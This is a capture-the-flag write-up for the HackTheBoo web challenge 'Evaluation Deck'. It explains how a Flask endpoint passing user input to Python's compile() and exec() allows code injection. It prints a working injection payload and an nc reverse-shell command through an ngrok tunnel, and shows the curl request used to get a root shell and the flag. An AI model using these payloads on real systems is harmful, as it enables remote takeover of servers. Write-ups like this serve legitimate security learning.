# Evaluation Deck

## Background

> A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?

> Difficulty: Easy

- Overall difficulty for me: Medium

**In this challenge, we can start a docker instance and [download a file](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Web/Evaluation-Deck/web_evaluation_deck.zip):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Web/Evaluation-Deck/images/a1.png)

```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Web/Evaluation-Deck]
└─# unzip web_evaluation_deck.zip 
Archive:  web_evaluation_deck.zip
   creating: web_evaluation_deck/
   creating: web_evaluation_deck/challenge/
  inflating: web_evaluation_deck/challenge/run.py  
   creating: web_evaluation_deck/challenge/application/
   creating: web_evaluation_deck/challenge/application/static/
   creating: web_evaluation_deck/challenge/application/static/images/
  inflating: web_evaluation_deck/challenge/application/static/images/card_back.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card15.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card13.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card6.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card14.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card8.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card5.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card12.png  
  inflating: web_evaluation_deck/challenge/application/static/images/alive.gif  
  inflating: web_evaluation_deck/challenge/application/static/images/card7.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card1.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card2.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card16.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card4.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card3.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card9.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card20.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card18.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card11.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card10.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card19.png  
  inflating: web_evaluation_deck/challenge/application/static/images/bottom-circle.png  
  inflating: web_evaluation_deck/challenge/application/static/images/card17.png  
  inflating: web_evaluation_deck/challenge/application/static/images/dead.gif  
   creating: web_evaluation_deck/challenge/application/static/css/
  inflating: web_evaluation_deck/challenge/application/static/css/card.css  
  inflating: web_evaluation_deck/challenge/application/static/css/index.css  
  inflating: web_evaluation_deck/challenge/application/static/css/game.css  
   creating: web_evaluation_deck/challenge/application/static/js/
  inflating: web_evaluation_deck/challenge/application/static/js/jquery.min.js  
  inflating: web_evaluation_deck/challenge/application/static/js/jquery-migrate-1.2.1.js  
  inflating: web_evaluation_deck/challenge/application/static/js/ui.js  
  inflating: web_evaluation_deck/challenge/application/static/js/card.js  
   creating: web_evaluation_deck/challenge/application/blueprints/
  inflating: web_evaluation_deck/challenge/application/blueprints/routes.py  
  inflating: web_evaluation_deck/challenge/application/util.py  
   creating: web_evaluation_deck/challenge/application/templates/
  inflating: web_evaluation_deck/challenge/application/templates/index.html  
  inflating: web_evaluation_deck/challenge/application/main.py  
   creating: web_evaluation_deck/config/
  inflating: web_evaluation_deck/config/supervisord.conf  
  inflating: web_evaluation_deck/build-docker.sh  
 extracting: web_evaluation_deck/flag.txt  
  inflating: web_evaluation_deck/Dockerfile
```

## Find the flag

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Web/Evaluation-Deck/images/a2.png)

**Looks like the `routes.py` is interesting for us!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Web/Evaluation-Deck/images/a3.png)

```py
from flask import Blueprint, render_template, request
from application.util import response

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def index():
    return render_template('index.html')

@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')
    
    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result)
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```

**In the `/api/get_health` route, it accepts POST request:**

- If the request is not in JSON format, returns status 400
- **It needs 3 parameters: `current_health`, `attack_power`, `operator`**
- If the request has no the above 3 parameters, returns status 400
- Then, try to take those 3 parameter values as input, and **returns a code object**, which is **ready to be executed and which can later be executed by the `exec()` function**
- **Run the above code object**

**Let's take a closer look at the following code:**
```py
web = Blueprint('web', __name__)
api = Blueprint('api', __name__)
###
###
code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
exec(code, result)
```

Hmm... The `current_health` value will be an integer, **`operator` will be a string**, `attack_power` will be an integer.

**What if I parse the `operator` value as a malicious code, do I get remote code execution??**

**Normal POST request:**
```
┌──(root🌸siunam)-[~/…/Evaluation-Deck/web_evaluation_deck/challenge/application]
└─# curl http://157.245.42.104:30611/api/get_health -X POST -H "Content-Type: application/json" -d '{"current_health":"100","attack_power":"0","operator":"-"}'
{"message":100}
```

**Malicious POST request:**
```
┌──(root🌸siunam)-[~/…/Evaluation-Deck/web_evaluation_deck/challenge/application]
└─# curl http://157.245.42.104:30611/api/get_health -X POST -H "Content-Type: application/json" -d '{"current_health":"100","attack_power":"0","operator":"test"}'
{"message":"Something Went Wrong!"}
```

Hmm... It shows us status 500.

**After some local testing, I can execute any code!**
```py
#!/usr/bin/env python3

def count():
	current_health = 0
	operator = ",print('hello'),"
	attack_power = 0

	result = {}

	code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
	exec(code, result)
	
	return result
	
if __name__ == '__main__':
	print(count())
```

**Output:**
```
┌──(root🌸siunam)-[~/…/Evaluation-Deck/web_evaluation_deck/challenge/application]
└─# python3 exploit.py
hello
[...]
```

**In an [SethSec](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html) article talking about injecting code in the python web applications, it has a payload:**

> Better yet, now that we have import and popen as one expression, in most cases, you don't even need to use compile at all:

```py
__import__('os').popen('COMMAND').read()
```

**Hmm... Let's get reverse shell then!**

**First, let me test it locally:**
```
┌──(root🌸siunam)-[~/…/Evaluation-Deck/web_evaluation_deck/challenge/application]
└─# ngrok tcp 9001
[...]
Web Interface                 http://127.0.0.1:4040                                                    
Forwarding                    tcp://0.tcp.ap.ngrok.io:14434 -> localhost:9001                          
                                                                                                       
Connections                   ttl     opn     rt1     rt5     p50     p90                              
                              0       0       0.00    0.00    0.00    0.00
```

**Setup a `nc` listener:**
```
┌──(root🌸siunam)-[~/…/Evaluation-Deck/web_evaluation_deck/challenge/application]
└─# nc -lnvp 9001
listening on [any] 9001 ...
```

**Change the payload to a reverse shell:**
```py
#!/usr/bin/env python3

def count():
	current_health = 0
	operator = ",__import__('os').popen('nc 0.tcp.ap.ngrok.io 14434 -e /bin/bash').read(),"
	attack_power = 0

	result = {}

	code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
	exec(code, result)
	
	return result
	
if __name__ == '__main__':
	print(count())
```

**Run it:**
```
┌──(root🌸siunam)-[~/…/Evaluation-Deck/web_evaluation_deck/challenge/application]
└─# python3 exploit.py

┌──(root🌸siunam)-[~/…/Evaluation-Deck/web_evaluation_deck/challenge/application]
└─# nc -lnvp 9001
listening on [any] 9001 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 34074
whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),119(wireshark),142(kaboxer)
siunam
```

Yes! It works!

**Let's get a shell from the docker instance!**
```
┌──(root🌸siunam)-[~/…/Evaluation-Deck/web_evaluation_deck/challenge/application]
└─# curl http://157.245.42.104:30611/api/get_health -X POST -H "Content-Type: application/json" -d '{"current_health":"100","attack_power":"0","operator":",__import__(\"os\").popen(\"nc 0.tcp.ap.ngrok.io 14434 -e /bin/sh\").read(),"}'
```

```
┌──(root🌸siunam)-[~/…/Evaluation-Deck/web_evaluation_deck/challenge/application]
└─# nc -lnvp 9001
listening on [any] 9001 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 55460
id
uid=0(root) gid=0(root) groups=1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

**I'm in! Let's get the flag!**
```
ls -lah /
[...]
-rw-r--r--    1 root     root          32 Oct 21 13:33 flag.txt
[...]

cat /flag.txt
HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}
```

# Conclusion

What we've learned:

1. Exploiting `compile()` Function in a Python Web Application